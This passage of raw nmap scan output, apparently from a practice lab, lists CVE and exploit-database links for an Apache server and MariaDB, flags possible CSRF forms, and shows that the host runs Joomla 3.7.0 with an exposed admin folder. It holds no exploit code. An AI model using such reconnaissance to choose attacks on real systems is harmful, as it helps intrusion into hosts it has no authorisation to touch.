|       C67E8849-6A50-5D5F-B898-6C5E431504E0    7.5     https://vulners.com/githubexploit/C67E8849-6A50-5D5F-B898-6C5E431504E0  *EXPLOIT*
|       C0380E16-C468-5540-A427-7FE34E7CF36B    7.5     https://vulners.com/githubexploit/C0380E16-C468-5540-A427-7FE34E7CF36B  *EXPLOIT*
|       BC027F41-02AD-5D71-A452-4DD62B0F1EE1    7.5     https://vulners.com/githubexploit/BC027F41-02AD-5D71-A452-4DD62B0F1EE1  *EXPLOIT*
|       B946B2A1-2914-537A-BF26-94B48FC501B3    7.5     https://vulners.com/githubexploit/B946B2A1-2914-537A-BF26-94B48FC501B3  *EXPLOIT*
|       B9151905-5395-5622-B789-E16B88F30C71    7.5     https://vulners.com/githubexploit/B9151905-5395-5622-B789-E16B88F30C71  *EXPLOIT*
|       B81BC21D-818E-5B33-96D7-062C14102874    7.5     https://vulners.com/githubexploit/B81BC21D-818E-5B33-96D7-062C14102874  *EXPLOIT*
|       B5E74010-A082-5ECE-AB37-623A5B33FE7D    7.5     https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D  *EXPLOIT*
|       B58E6202-6D04-5CB0-8529-59713C0E13B8    7.5     https://vulners.com/githubexploit/B58E6202-6D04-5CB0-8529-59713C0E13B8  *EXPLOIT*
|       B53D7077-1A2B-5640-9581-0196F6138301    7.5     https://vulners.com/githubexploit/B53D7077-1A2B-5640-9581-0196F6138301  *EXPLOIT*
|       A9C7FB0F-65EC-5557-B6E8-6AFBBF8F140F    7.5     https://vulners.com/githubexploit/A9C7FB0F-65EC-5557-B6E8-6AFBBF8F140F  *EXPLOIT*
|       A3F15BCE-08AD-509D-AE63-9D3D8E402E0B    7.5     https://vulners.com/githubexploit/A3F15BCE-08AD-509D-AE63-9D3D8E402E0B  *EXPLOIT*
|       A0F268C8-7319-5637-82F7-8DAF72D14629    7.5     https://vulners.com/githubexploit/A0F268C8-7319-5637-82F7-8DAF72D14629  *EXPLOIT*
|       9EE3F7E3-70E6-503E-9929-67FE3F3735A2    7.5     https://vulners.com/githubexploit/9EE3F7E3-70E6-503E-9929-67FE3F3735A2  *EXPLOIT*
|       9D511461-7D24-5402-8E2A-58364D6E758F    7.5     https://vulners.com/githubexploit/9D511461-7D24-5402-8E2A-58364D6E758F  *EXPLOIT*
|       9CEA663C-6236-5F45-B207-A873B971F988    7.5     https://vulners.com/githubexploit/9CEA663C-6236-5F45-B207-A873B971F988  *EXPLOIT*
|       987C6FDB-3E70-5FF5-AB5B-D50065D27594    7.5     https://vulners.com/githubexploit/987C6FDB-3E70-5FF5-AB5B-D50065D27594  *EXPLOIT*
|       89732403-A14E-5A5D-B659-DD4830410847    7.5     https://vulners.com/githubexploit/89732403-A14E-5A5D-B659-DD4830410847  *EXPLOIT*
|       7C40F14D-44E4-5155-95CF-40899776329C    7.5     https://vulners.com/githubexploit/7C40F14D-44E4-5155-95CF-40899776329C  *EXPLOIT*
|       789B6112-E84C-566E-89A7-82CC108EFCD9    7.5     https://vulners.com/githubexploit/789B6112-E84C-566E-89A7-82CC108EFCD9  *EXPLOIT*
|       788F7DF8-01F3-5D13-9B3E-E4AA692153E6    7.5     https://vulners.com/githubexploit/788F7DF8-01F3-5D13-9B3E-E4AA692153E6  *EXPLOIT*
|       749F952B-3ACF-56B2-809D-D66E756BE839    7.5     https://vulners.com/githubexploit/749F952B-3ACF-56B2-809D-D66E756BE839  *EXPLOIT*
|       6E484197-456B-55DF-8D51-C2BB4925F45C    7.5     https://vulners.com/githubexploit/6E484197-456B-55DF-8D51-C2BB4925F45C  *EXPLOIT*
|       6BCBA83C-4A4C-58D7-92E4-DF092DFEF267    7.5     https://vulners.com/githubexploit/6BCBA83C-4A4C-58D7-92E4-DF092DFEF267  *EXPLOIT*
|       68E78C64-D93A-5E8B-9DEA-4A8D826B474E    7.5     https://vulners.com/githubexploit/68E78C64-D93A-5E8B-9DEA-4A8D826B474E  *EXPLOIT*
|       68A13FF0-60E5-5A29-9248-83A940B0FB02    7.5     https://vulners.com/githubexploit/68A13FF0-60E5-5A29-9248-83A940B0FB02  *EXPLOIT*
|       6758CFA9-271A-5E99-A590-E51F4E0C5046    7.5     https://vulners.com/githubexploit/6758CFA9-271A-5E99-A590-E51F4E0C5046  *EXPLOIT*
|       674BA200-C494-57E6-B1B4-1672DDA15D3C    7.5     https://vulners.com/githubexploit/674BA200-C494-57E6-B1B4-1672DDA15D3C  *EXPLOIT*
|       5A54F5DA-F9C1-508B-AD2D-3E45CD647D31    7.5     https://vulners.com/githubexploit/5A54F5DA-F9C1-508B-AD2D-3E45CD647D31  *EXPLOIT*
|       4E5A5BA8-3BAF-57F0-B71A-F04B4D066E4F    7.5     https://vulners.com/githubexploit/4E5A5BA8-3BAF-57F0-B71A-F04B4D066E4F  *EXPLOIT*
|       4C79D8E5-D595-5460-AA84-18D4CB93E8FC    7.5     https://vulners.com/githubexploit/4C79D8E5-D595-5460-AA84-18D4CB93E8FC  *EXPLOIT*
|       4B14D194-BDE3-5D7F-A262-A701F90DE667    7.5     https://vulners.com/githubexploit/4B14D194-BDE3-5D7F-A262-A701F90DE667  *EXPLOIT*
|       45D138AD-BEC6-552A-91EA-8816914CA7F4    7.5     https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4  *EXPLOIT*
|       41F0C2DA-2A2B-5ACC-A98D-CAD8D5AAD5ED    7.5     https://vulners.com/githubexploit/41F0C2DA-2A2B-5ACC-A98D-CAD8D5AAD5ED  *EXPLOIT*
|       4051D2EF-1C43-576D-ADB2-B519B31F93A0    7.5     https://vulners.com/githubexploit/4051D2EF-1C43-576D-ADB2-B519B31F93A0  *EXPLOIT*
|       3CF66144-235E-5F7A-B889-113C11ABF150    7.5     https://vulners.com/githubexploit/3CF66144-235E-5F7A-B889-113C11ABF150  *EXPLOIT*
|       379FCF38-0B4A-52EC-BE3E-408A0467BF20    7.5     https://vulners.com/githubexploit/379FCF38-0B4A-52EC-BE3E-408A0467BF20  *EXPLOIT*
|       365CD0B0-D956-59D6-9500-965BF4017E2D    7.5     https://vulners.com/githubexploit/365CD0B0-D956-59D6-9500-965BF4017E2D  *EXPLOIT*
|       2E98EA81-24D1-5D5B-80B9-A8D616BF3C3F    7.5     https://vulners.com/githubexploit/2E98EA81-24D1-5D5B-80B9-A8D616BF3C3F  *EXPLOIT*
|       2B4FEB27-377B-557B-AE46-66D677D5DA1C    7.5     https://vulners.com/githubexploit/2B4FEB27-377B-557B-AE46-66D677D5DA1C  *EXPLOIT*
|       2A177215-CE4A-5FA7-B016-EEAF332D165C    7.5     https://vulners.com/githubexploit/2A177215-CE4A-5FA7-B016-EEAF332D165C  *EXPLOIT*
|       1B75F2E2-5B30-58FA-98A4-501B91327D7F    7.5     https://vulners.com/githubexploit/1B75F2E2-5B30-58FA-98A4-501B91327D7F  *EXPLOIT*
|       18AE455A-1AA7-5386-81C2-39DA02CEFB57    7.5     https://vulners.com/githubexploit/18AE455A-1AA7-5386-81C2-39DA02CEFB57  *EXPLOIT*
|       1337DAY-ID-38427        7.5     https://vulners.com/zdt/1337DAY-ID-38427        *EXPLOIT*
|       1337DAY-ID-37030        7.5     https://vulners.com/zdt/1337DAY-ID-37030        *EXPLOIT*
|       1337DAY-ID-36937        7.5     https://vulners.com/zdt/1337DAY-ID-36937        *EXPLOIT*
|       1337DAY-ID-36897        7.5     https://vulners.com/zdt/1337DAY-ID-36897        *EXPLOIT*
|       1145F3D1-0ECB-55AA-B25D-A26892116505    7.5     https://vulners.com/githubexploit/1145F3D1-0ECB-55AA-B25D-A26892116505  *EXPLOIT*
|       108A0713-4AB8-5A1F-A16B-4BB13ECEC9B2    7.5     https://vulners.com/githubexploit/108A0713-4AB8-5A1F-A16B-4BB13ECEC9B2  *EXPLOIT*
|       0C28A0EC-7162-5D73-BEC9-B034F5392847    7.5     https://vulners.com/githubexploit/0C28A0EC-7162-5D73-BEC9-B034F5392847  *EXPLOIT*
|       0BC014D0-F944-5E78-B5FA-146A8E5D0F8A    7.5     https://vulners.com/githubexploit/0BC014D0-F944-5E78-B5FA-146A8E5D0F8A  *EXPLOIT*
|       06076ECD-3FB7-53EC-8572-ABBB20029812    7.5     https://vulners.com/githubexploit/06076ECD-3FB7-53EC-8572-ABBB20029812  *EXPLOIT*
|       00EC8F03-D8A3-56D4-9F8C-8DD1F5ACCA08    7.5     https://vulners.com/githubexploit/00EC8F03-D8A3-56D4-9F8C-8DD1F5ACCA08  *EXPLOIT*
|       CVE-2023-38709  7.3     https://vulners.com/cve/CVE-2023-38709
|       CVE-2020-35452  7.3     https://vulners.com/cve/CVE-2020-35452
|       CNVD-2024-36395 7.3     https://vulners.com/cnvd/CNVD-2024-36395
|       95499236-C9FE-56A6-9D7D-E943A24B633A    6.9     https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       PACKETSTORM:127546      6.8     https://vulners.com/packetstorm/PACKETSTORM:127546      *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
|       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226
|       4427DEE4-E1E2-5A16-8683-D74750941604    6.8     https://vulners.com/githubexploit/4427DEE4-E1E2-5A16-8683-D74750941604  *EXPLOIT*
|       1337DAY-ID-22451        6.8     https://vulners.com/zdt/1337DAY-ID-22451        *EXPLOIT*
|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
|       CVE-2024-24795  6.3     https://vulners.com/cve/CVE-2024-24795
|       CVE-2024-39884  6.2     https://vulners.com/cve/CVE-2024-39884
|       CVE-2020-1927   6.1     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  6.1     https://vulners.com/cve/CVE-2019-10098
|       CVE-2019-10092  6.1     https://vulners.com/cve/CVE-2019-10092
|       CVE-2016-4975   6.1     https://vulners.com/cve/CVE-2016-4975
|       CVE-2018-1302   5.9     https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   5.9     https://vulners.com/cve/CVE-2018-1301
|       45F0EB7B-CE04-5103-9D40-7379AE4B6CDD    5.8     https://vulners.com/githubexploit/45F0EB7B-CE04-5103-9D40-7379AE4B6CDD  *EXPLOIT*
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
|       CVE-2020-13938  5.5     https://vulners.com/cve/CVE-2020-13938
|       CVE-2022-37436  5.3     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-28614  5.3     https://vulners.com/cve/CVE-2022-28614
|       CVE-2022-28330  5.3     https://vulners.com/cve/CVE-2022-28330
|       CVE-2021-30641  5.3     https://vulners.com/cve/CVE-2021-30641
|       CVE-2020-1934   5.3     https://vulners.com/cve/CVE-2020-1934
|       CVE-2020-11985  5.3     https://vulners.com/cve/CVE-2020-11985
|       CVE-2019-17567  5.3     https://vulners.com/cve/CVE-2019-17567
|       CVE-2019-0220   5.3     https://vulners.com/cve/CVE-2019-0220
|       CVE-2018-1283   5.3     https://vulners.com/cve/CVE-2018-1283
|       CNVD-2023-30859 5.3     https://vulners.com/cnvd/CNVD-2023-30859
|       CNVD-2022-53582 5.3     https://vulners.com/cnvd/CNVD-2022-53582
|       CNVD-2022-51059 5.3     https://vulners.com/cnvd/CNVD-2022-51059
|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT*
|       SSV:62058       5.0     https://vulners.com/seebug/SSV:62058    *EXPLOIT*
|       SSV:61874       5.0     https://vulners.com/seebug/SSV:61874    *EXPLOIT*
|       EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    5.0     https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    *EXPLOIT*
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
|       CVE-2015-3183   5.0     https://vulners.com/cve/CVE-2015-3183
|       CVE-2015-0228   5.0     https://vulners.com/cve/CVE-2015-0228
|       CVE-2014-3581   5.0     https://vulners.com/cve/CVE-2014-3581
|       CVE-2014-3523   5.0     https://vulners.com/cve/CVE-2014-3523
|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098
|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438
|       CVE-2013-5704   5.0     https://vulners.com/cve/CVE-2013-5704
|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT*
|       1337DAY-ID-26574        5.0     https://vulners.com/zdt/1337DAY-ID-26574        *EXPLOIT*
|       SSV:87152       4.3     https://vulners.com/seebug/SSV:87152    *EXPLOIT*
|       PACKETSTORM:127563      4.3     https://vulners.com/packetstorm/PACKETSTORM:127563      *EXPLOIT*
|       FFE89CAE-FAA6-5E93-9994-B5F4D0EC2197    4.3     https://vulners.com/githubexploit/FFE89CAE-FAA6-5E93-9994-B5F4D0EC2197  *EXPLOIT*
|       F893E602-F8EB-5D23-8ABF-920890DB23A3    4.3     https://vulners.com/githubexploit/F893E602-F8EB-5D23-8ABF-920890DB23A3  *EXPLOIT*
|       F463914D-1B20-54CA-BF87-EA28F3ADE2A3    4.3     https://vulners.com/githubexploit/F463914D-1B20-54CA-BF87-EA28F3ADE2A3  *EXPLOIT*
|       ECD5D758-774C-5488-B782-C8996208B401    4.3     https://vulners.com/githubexploit/ECD5D758-774C-5488-B782-C8996208B401  *EXPLOIT*
|       E9FE319B-26BF-5A75-8C6A-8AE55D7E7615    4.3     https://vulners.com/githubexploit/E9FE319B-26BF-5A75-8C6A-8AE55D7E7615  *EXPLOIT*
|       DF57E8F1-FE21-5EB9-8FC7-5F2EA267B09D    4.3     https://vulners.com/githubexploit/DF57E8F1-FE21-5EB9-8FC7-5F2EA267B09D  *EXPLOIT*
|       D7922C26-D431-5825-9897-B98478354289    4.3     https://vulners.com/githubexploit/D7922C26-D431-5825-9897-B98478354289  *EXPLOIT*
|       CVE-2016-8612   4.3     https://vulners.com/cve/CVE-2016-8612
|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185
|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109
|       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118
|       CVE-2014-0117   4.3     https://vulners.com/cve/CVE-2014-0117
|       CVE-2013-4352   4.3     https://vulners.com/cve/CVE-2013-4352
|       C26A395B-9695-59E4-908F-866A561936E9    4.3     https://vulners.com/githubexploit/C26A395B-9695-59E4-908F-866A561936E9  *EXPLOIT*
|       C068A003-5258-51DC-A3C0-786638A1B69C    4.3     https://vulners.com/githubexploit/C068A003-5258-51DC-A3C0-786638A1B69C  *EXPLOIT*
|       B8198D62-F9C8-5E03-A301-9A3580070B4C    4.3     https://vulners.com/githubexploit/B8198D62-F9C8-5E03-A301-9A3580070B4C  *EXPLOIT*
|       B4483895-BA86-5CFB-84F3-7C06411B5175    4.3     https://vulners.com/githubexploit/B4483895-BA86-5CFB-84F3-7C06411B5175  *EXPLOIT*
|       A6753173-D2DC-54CC-A5C4-0751E61F0343    4.3     https://vulners.com/githubexploit/A6753173-D2DC-54CC-A5C4-0751E61F0343  *EXPLOIT*
|       A1FF76C0-CF98-5704-AEE4-DF6F1E434FA3    4.3     https://vulners.com/githubexploit/A1FF76C0-CF98-5704-AEE4-DF6F1E434FA3  *EXPLOIT*
|       8FB9E7A8-9A5B-5D87-9A44-AE4A1A92213D    4.3     https://vulners.com/githubexploit/8FB9E7A8-9A5B-5D87-9A44-AE4A1A92213D  *EXPLOIT*
|       8A14FEAD-A401-5B54-84EB-2059841AD1DD    4.3     https://vulners.com/githubexploit/8A14FEAD-A401-5B54-84EB-2059841AD1DD  *EXPLOIT*
|       7248BA4C-3FE5-5529-9E4C-C91E241E8AA0    4.3     https://vulners.com/githubexploit/7248BA4C-3FE5-5529-9E4C-C91E241E8AA0  *EXPLOIT*
|       6E104766-2F7A-5A0A-A24B-61D9B52AD4EE    4.3     https://vulners.com/githubexploit/6E104766-2F7A-5A0A-A24B-61D9B52AD4EE  *EXPLOIT*
|       6C0C909F-3307-5755-97D2-0EBD17367154    4.3     https://vulners.com/githubexploit/6C0C909F-3307-5755-97D2-0EBD17367154  *EXPLOIT*
|       628A345B-5FD8-5A2F-8782-9125584E4C89    4.3     https://vulners.com/githubexploit/628A345B-5FD8-5A2F-8782-9125584E4C89  *EXPLOIT*
|       5D88E443-7AB2-5034-910D-D52A5EFFF5FC    4.3     https://vulners.com/githubexploit/5D88E443-7AB2-5034-910D-D52A5EFFF5FC  *EXPLOIT*
|       500CE683-17EB-5776-8EF6-85122451B145    4.3     https://vulners.com/githubexploit/500CE683-17EB-5776-8EF6-85122451B145  *EXPLOIT*
|       4E4BAF15-6430-514A-8679-5B9F03584B71    4.3     https://vulners.com/githubexploit/4E4BAF15-6430-514A-8679-5B9F03584B71  *EXPLOIT*
|       4B46EB21-DF1F-5D84-AE44-9BCFE311DFB9    4.3     https://vulners.com/githubexploit/4B46EB21-DF1F-5D84-AE44-9BCFE311DFB9  *EXPLOIT*
|       4B44115D-85A3-5E62-B9A8-5F336C24673F    4.3     https://vulners.com/githubexploit/4B44115D-85A3-5E62-B9A8-5F336C24673F  *EXPLOIT*
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
|       3C5B500C-1858-5834-9D23-38DBE44AE969    4.3     https://vulners.com/githubexploit/3C5B500C-1858-5834-9D23-38DBE44AE969  *EXPLOIT*
|       3B159471-590A-5941-ADED-20F4187E8C63    4.3     https://vulners.com/githubexploit/3B159471-590A-5941-ADED-20F4187E8C63  *EXPLOIT*
|       3AE03E90-26EC-5F91-B84E-F04AF6239A9F    4.3     https://vulners.com/githubexploit/3AE03E90-26EC-5F91-B84E-F04AF6239A9F  *EXPLOIT*
|       37A9128D-17C4-50FF-B025-5FC3E0F3F338    4.3     https://vulners.com/githubexploit/37A9128D-17C4-50FF-B025-5FC3E0F3F338  *EXPLOIT*
|       3749CB78-BE3A-5018-8838-CA693845B5BD    4.3     https://vulners.com/githubexploit/3749CB78-BE3A-5018-8838-CA693845B5BD  *EXPLOIT*
|       27108E72-8DC1-53B5-97D9-E869CA13EFF7    4.3     https://vulners.com/githubexploit/27108E72-8DC1-53B5-97D9-E869CA13EFF7  *EXPLOIT*
|       24ADD37D-C8A1-5671-A0F4-378760FC69AC    4.3     https://vulners.com/githubexploit/24ADD37D-C8A1-5671-A0F4-378760FC69AC  *EXPLOIT*
|       1E6E9010-4BDF-5C30-951C-79C280B90883    4.3     https://vulners.com/githubexploit/1E6E9010-4BDF-5C30-951C-79C280B90883  *EXPLOIT*
|       1337DAY-ID-36854        4.3     https://vulners.com/zdt/1337DAY-ID-36854        *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|       04E3583E-DFED-5D0D-BCF2-1C1230EB666D    4.3     https://vulners.com/githubexploit/04E3583E-DFED-5D0D-BCF2-1C1230EB666D  *EXPLOIT*
|       PACKETSTORM:164501      0.0     https://vulners.com/packetstorm/PACKETSTORM:164501      *EXPLOIT*
|       PACKETSTORM:164418      0.0     https://vulners.com/packetstorm/PACKETSTORM:164418      *EXPLOIT*
|       PACKETSTORM:140265      0.0     https://vulners.com/packetstorm/PACKETSTORM:140265      *EXPLOIT*
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.132.218
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.132.218:80/
|     Form id: login-form
|     Form action: /index.php
|     
|     Path: http://10.10.132.218:80/index.php
|     Form id: login-form
|     Form action: /index.php
|     
|     Path: http://10.10.132.218:80/index.php/component/users/?view=remind&amp;Itemid=101
|     Form id: user-registration
|     Form action: /index.php/component/users/?task=remind.remind&Itemid=101
|     
|     Path: http://10.10.132.218:80/index.php/component/users/?view=remind&amp;Itemid=101
|     Form id: login-form
|     Form action: /index.php/component/users/?Itemid=101
|     
|     Path: http://10.10.132.218:80/index.php/2-uncategorised
|     Form id: login-form
|     Form action: /index.php
|     
|     Path: http://10.10.132.218:80/index.php/2-uncategorised/1-spider-man-robs-bank
|     Form id: login-form
|_    Form action: /index.php
| http-enum: 
|   /administrator/: Possible admin folder
|   /administrator/index.php: Possible admin folder
|   /robots.txt: Robots file
|   /administrator/manifests/files/joomla.xml: Joomla version 3.7.0
|   /language/en-GB/en-GB.xml: Joomla version 3.7.0
|   /htaccess.txt: Joomla!
|   /README.txt: Interesting, a readme.
|   /bin/: Potentially interesting folder
|   /cache/: Potentially interesting folder
|   /icons/: Potentially interesting folder w/ directory listing
|   /images/: Potentially interesting folder
|   /includes/: Potentially interesting folder
|   /libraries/: Potentially interesting folder
|   /modules/: Potentially interesting folder
|   /templates/: Potentially interesting folder
|_  /tmp/: Potentially interesting folder
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
| vulners: 
|   MariaDB 10.3.23 or earlier: 
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:162177      9.0     https://vulners.com/packetstorm/PACKETSTORM:162177      *EXPLOIT*
|       ED02704E-93D2-5BC1-8EEA-7D111EFB4D60    9.0     https://vulners.com/githubexploit/ED02704E-93D2-5BC1-8EEA-7D111EFB4D60  *EXPLOIT*
|       CVE-2020-15180  9.0     https://vulners.com/cve/CVE-2020-15180
|       BB888EE2-B352-529F-91F8-6EA5BA6E1DC7    9.0     https://vulners.com/githubexploit/BB888EE2-B352-529F-91F8-6EA5BA6E1DC7  *EXPLOIT*
|       6197722F-1A68-5649-98B9-835D23DEB2FA    9.0     https://vulners.com/githubexploit/6197722F-1A68-5649-98B9-835D23DEB2FA  *EXPLOIT*
|       CVE-2022-24052  7.8     https://vulners.com/cve/CVE-2022-24052
|       CVE-2022-24051  7.8     https://vulners.com/cve/CVE-2022-24051
|       CVE-2022-24050  7.8     https://vulners.com/cve/CVE-2022-24050
|       CVE-2022-24048  7.8     https://vulners.com/cve/CVE-2022-24048
|       40675E99-5463-5FDD-AAA5-DD4A37DE8A2B    7.8     https://vulners.com/githubexploit/40675E99-5463-5FDD-AAA5-DD4A37DE8A2B  *EXPLOIT*
|       CVE-2023-5157   7.5     https://vulners.com/cve/CVE-2023-5157
|       CVE-2022-32091  7.5     https://vulners.com/cve/CVE-2022-32091
|       CVE-2022-32088  7.5     https://vulners.com/cve/CVE-2022-32088
|       CVE-2022-32087  7.5     https://vulners.com/cve/CVE-2022-32087
|       CVE-2022-32085  7.5     https://vulners.com/cve/CVE-2022-32085
|       CVE-2022-32084  7.5     https://vulners.com/cve/CVE-2022-32084
|       CVE-2022-32083  7.5     https://vulners.com/cve/CVE-2022-32083
|       CVE-2022-27456  7.5     https://vulners.com/cve/CVE-2022-27456
|       CVE-2022-27452  7.5     https://vulners.com/cve/CVE-2022-27452
|       CVE-2022-27449  7.5     https://vulners.com/cve/CVE-2022-27449
|       CVE-2022-27448  7.5     https://vulners.com/cve/CVE-2022-27448
|       CVE-2022-27447  7.5     https://vulners.com/cve/CVE-2022-27447
|       CVE-2022-27445  7.5     https://vulners.com/cve/CVE-2022-27445
|       CVE-2022-27387  7.5     https://vulners.com/cve/CVE-2022-27387
|       CVE-2022-27386  7.5     https://vulners.com/cve/CVE-2022-27386
|       CVE-2022-27385  7.5     https://vulners.com/cve/CVE-2022-27385
|       CVE-2022-27384  7.5     https://vulners.com/cve/CVE-2022-27384
|       CVE-2022-27383  7.5     https://vulners.com/cve/CVE-2022-27383
|       CVE-2022-27381  7.5     https://vulners.com/cve/CVE-2022-27381
|       CVE-2022-27380  7.5     https://vulners.com/cve/CVE-2022-27380
|       CVE-2022-27379  7.5     https://vulners.com/cve/CVE-2022-27379
|       CVE-2022-27378  7.5     https://vulners.com/cve/CVE-2022-27378
|       CVE-2022-27377  7.5     https://vulners.com/cve/CVE-2022-27377
|       CVE-2022-27376  7.5     https://vulners.com/cve/CVE-2022-27376
|       CVE-2022-0778   7.5     https://vulners.com/cve/CVE-2022-0778
|       CVE-2021-46669  7.5     https://vulners.com/cve/CVE-2021-46669
|       CVE-2018-25032  7.5     https://vulners.com/cve/CVE-2018-25032
|       658B3734-0DA9-5332-A307-23C1967D9C0A    7.5     https://vulners.com/githubexploit/658B3734-0DA9-5332-A307-23C1967D9C0A  *EXPLOIT*
|       588C33E5-7CDF-5EC7-9294-74B308DC6535    7.5     https://vulners.com/githubexploit/588C33E5-7CDF-5EC7-9294-74B308DC6535  *EXPLOIT*
|       2DA0FD9C-9E20-5C51-A357-EB46391407F7    7.5     https://vulners.com/githubexploit/2DA0FD9C-9E20-5C51-A357-EB46391407F7  *EXPLOIT*
|       215EF040-369B-5FBF-A9F5-F81833E29553    7.5     https://vulners.com/githubexploit/215EF040-369B-5FBF-A9F5-F81833E29553  *EXPLOIT*
|       0C866B2A-86E3-5C5A-AA62-622683A9A0DA    7.5     https://vulners.com/githubexploit/0C866B2A-86E3-5C5A-AA62-622683A9A0DA  *EXPLOIT*
|       EDB-ID:49765    7.2     https://vulners.com/exploitdb/EDB-ID:49765      *EXPLOIT*
|       CVE-2021-27928  7.2     https://vulners.com/cve/CVE-2021-27928
|       ADC11B61-18F7-5937-A880-2EA089532DD2    7.2     https://vulners.com/githubexploit/ADC11B61-18F7-5937-A880-2EA089532DD2  *EXPLOIT*
|       1337DAY-ID-36107        7.2     https://vulners.com/zdt/1337DAY-ID-36107        *EXPLOIT*
|       CVE-2020-28912  7.0     https://vulners.com/cve/CVE-2020-28912
|       95499236-C9FE-56A6-9D7D-E943A24B633A    6.9     https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       CVE-2022-47015  6.5     https://vulners.com/cve/CVE-2022-47015
|       CVE-2020-14765  6.5     https://vulners.com/cve/CVE-2020-14765
|       CVE-2021-2389   5.9     https://vulners.com/cve/CVE-2021-2389
|       CVE-2022-38791  5.5     https://vulners.com/cve/CVE-2022-38791
|       CVE-2022-31624  5.5     https://vulners.com/cve/CVE-2022-31624
|       CVE-2022-31623  5.5     https://vulners.com/cve/CVE-2022-31623
|       CVE-2022-31622  5.5     https://vulners.com/cve/CVE-2022-31622
|       CVE-2022-31621  5.5     https://vulners.com/cve/CVE-2022-31621
|       CVE-2021-46668  5.5     https://vulners.com/cve/CVE-2021-46668
|       CVE-2021-46667  5.5     https://vulners.com/cve/CVE-2021-46667
|       CVE-2021-46666  5.5     https://vulners.com/cve/CVE-2021-46666
|       CVE-2021-46665  5.5     https://vulners.com/cve/CVE-2021-46665
|       CVE-2021-46664  5.5     https://vulners.com/cve/CVE-2021-46664
|       CVE-2021-46662  5.5     https://vulners.com/cve/CVE-2021-46662
|       CVE-2021-46661  5.5     https://vulners.com/cve/CVE-2021-46661
|       CVE-2021-46659  5.5     https://vulners.com/cve/CVE-2021-46659
|       CVE-2021-46658  5.5     https://vulners.com/cve/CVE-2021-46658
|       CVE-2021-46657  5.5     https://vulners.com/cve/CVE-2021-46657
|       CVE-2021-35604  5.5     https://vulners.com/cve/CVE-2021-35604
|       CVE-2020-2760   5.5     https://vulners.com/cve/CVE-2020-2760
|       CNVD-2022-65012 5.5     https://vulners.com/cnvd/CNVD-2022-65012
|       CVE-2020-2752   5.3     https://vulners.com/cve/CVE-2020-2752
|       5ACB7D6C-CC90-52D8-BFB9-C783C3ACA5FA    5.0     https://vulners.com/githubexploit/5ACB7D6C-CC90-52D8-BFB9-C783C3ACA5FA  *EXPLOIT*
|       0A299930-C365-5428-95BA-8E8D40BB77DC    5.0     https://vulners.com/githubexploit/0A299930-C365-5428-95BA-8E8D40BB77DC  *EXPLOIT*
|       CVE-2022-21427  4.9     https://vulners.com/cve/CVE-2022-21427
|       CVE-2021-2194   4.9     https://vulners.com/cve/CVE-2021-2194
|       CVE-2021-2166   4.9     https://vulners.com/cve/CVE-2021-2166
|       CVE-2021-2154   4.9     https://vulners.com/cve/CVE-2021-2154
|       CVE-2020-2814   4.9     https://vulners.com/cve/CVE-2020-2814
|       CVE-2020-2812   4.9     https://vulners.com/cve/CVE-2020-2812
|       CVE-2020-14812  4.9     https://vulners.com/cve/CVE-2020-14812
|       CVE-2020-14789  4.9     https://vulners.com/cve/CVE-2020-14789
|       CVE-2020-14776  4.9     https://vulners.com/cve/CVE-2020-14776
|       CVE-2022-21595  4.4     https://vulners.com/cve/CVE-2022-21595
|       CVE-2022-21451  4.4     https://vulners.com/cve/CVE-2022-21451
|       CVE-2021-2372   4.4     https://vulners.com/cve/CVE-2021-2372
|_      CVE-2021-2022   4.4     https://vulners.com/cve/CVE-2021-2022
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   90.99 ms 10.23.0.1
2   91.05 ms 10.10.132.218

